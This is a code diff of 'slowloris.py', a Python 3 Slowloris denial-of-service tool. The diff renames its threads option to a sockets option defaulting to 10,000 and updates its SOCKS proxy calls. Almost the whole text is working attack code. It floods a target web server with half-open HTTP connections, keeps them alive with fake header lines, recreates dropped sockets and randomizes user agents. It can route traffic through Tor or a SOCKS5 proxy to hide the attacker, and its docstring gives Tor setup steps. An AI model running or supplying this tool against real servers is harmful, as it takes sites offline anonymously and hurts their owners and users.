@@ -1,5 +1,15 @@
 #!/usr/bin/env python3
 
+'''
+
+slowloris.py - Slowloris implementation in Python3 with support for Tor and general SOCKS5 proxies.
+
+--
+
+Gabriel Duque - 2017
+
+'''
+
 import click
 import socket
 import logging
@@ -25,18 +35,18 @@ def init_connection(target, port, randomize, user_agents):
     # Return the conected socket
     return sock
 
-#Use click to handle arguments and switches
+# Use click to handle arguments and switches
 
 @click.command()
 @click.option('--port', '-p', default=80, help="Port to attack on the remote target. Default is 80.")
-@click.option('--threads', '-t', default=1000, help="Number of connections to start with the remote target.")
+@click.option('--sockets', '-s', default=10000, help="Number of sockets to open with the remote target.")
 @click.option('--randomize', '-r', is_flag=True, help="Randomize user agents for every new socket.")
 @click.option('--tor', '-T', is_flag=True, help="Open the connections the connections through the Tor network by using localhost:9050 as a SOCKS5 proxy. If you wish to use the Tor network through another host or port you must use the -x option.")
 @click.option('--proxy', '-x', help="Usage: -x proxy-host:proxy-port .Use a SOCKS5 proxy to communicate with the target.")
 @click.option('--quiet', '-q', is_flag=True, help="Run the script in quiet mode removing all output.")
 @click.argument('target', required=1)
-def attack(target, port, threads, randomize, tor, proxy, quiet):
-    """A Slow Loris atack implementation in Python3 with support for ssl, proxies and the Tor network.\n
+def attack(target, port, sockets, randomize, tor, proxy, quiet):
+    """A Slow Loris atack implementation in Python3 with support for proxies and the Tor network.\n
     You must have the click Python3 module which can be installed with pip:\n
         $ sudo pip3 install click\n
     You must have the socks Python3 module which can be installed through various packages by using pip, we suggest PySocks:\n
@@ -50,7 +60,7 @@ def attack(target, port, threads, randomize, tor, proxy, quiet):
         Gentoo Linux:   # emerge --ask --verbose net-vpn/tor\n
         CentOS/Fedora:  # yum install tor\n
     Starting the tor service:\n
-        If you do not know if you are using Systemd or OpenRC you are very probably using Systemd.        \n
+        If you do not know if you are using Systemd or OpenRC you are very probably using Systemd.\n
         Systemd: # systemctl start tor\n
         OpenRC:  # rc-service tor start"""
 
@@ -64,7 +74,7 @@ def attack(target, port, threads, randomize, tor, proxy, quiet):
     if tor:
         try:
             import socks
-            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, 'localhost', 9050)
+            socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
             socket.socket = socks.socksocket
             logging.info("Tor enabled on localhost:9050")
         except ImportError:
@@ -74,15 +84,15 @@ def attack(target, port, threads, randomize, tor, proxy, quiet):
     elif proxy:
         try:
             import socks
-            proxy_host = proxy.split(':')[0]
-            proxy_port = proxy.split(':')[1]
-            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_host, int(proxy_port))
+            proxy_host = proxy.split(":")[0]
+            proxy_port = proxy.split(":")[1]
+            socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
             socket.socket = socks.socksocket
             logging.info("SOCKS5 proxy enabled on "+proxy_host+":"+proxy_port)
         except ImportError:
             logging.error("Socks proxy library not found...")
 
-    sockets = []
+    socket_list = []
 
     user_agents = [
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
@@ -114,36 +124,36 @@ def attack(target, port, threads, randomize, tor, proxy, quiet):
 
 
     # Inform user the script has started
-    logging.info("Target: %s \tThreads: %s", target, threads)
+    logging.info("Target: %s \tThreads: %s", target, sockets)
 
     logging.info("Creating sockets...")
 
     # Start connecting with the target
-    for i in range(threads):
+    for i in range(sockets):
         try:
             logging.debug("Creating socket number %s", i)
             sock = init_connection(target, port, randomize, user_agents)
         except socket.error:
             break
-        sockets.append(sock)
+        socket_list.append(sock)
 
     # Send the keep-alive messages so the target doesn't close the connections
     while True:
-        logging.info("Keeping connections alive... Socket count: %s", len(sockets))
-        for sock in list(sockets):
+        logging.info("Keeping connections alive... Socket count: %s", len(socket_list))
+        for sock in list(socket_list):
             try:
                 sock.send("X-a: {}\r\n".format(randint(1, 5000)).encode("utf-8"))
             except socket.error:
                 # Remove socket from list if dead connection
-                sockets.remove(sock)
+                socket_list.remove(sock)
 
         # Recreate dead sockets
         logging.debug("Recreating dead sockets...")
-        for i in range(threads - len(sockets)):
+        for i in range(sockets - len(socket_list)):
             try:
                 sock = init_connection(target, port, randomize, user_agents)
                 if sock:
-                    sockets.append(sock)
+                    socket_list.append(sock)
             except socket.error:
                 break
 
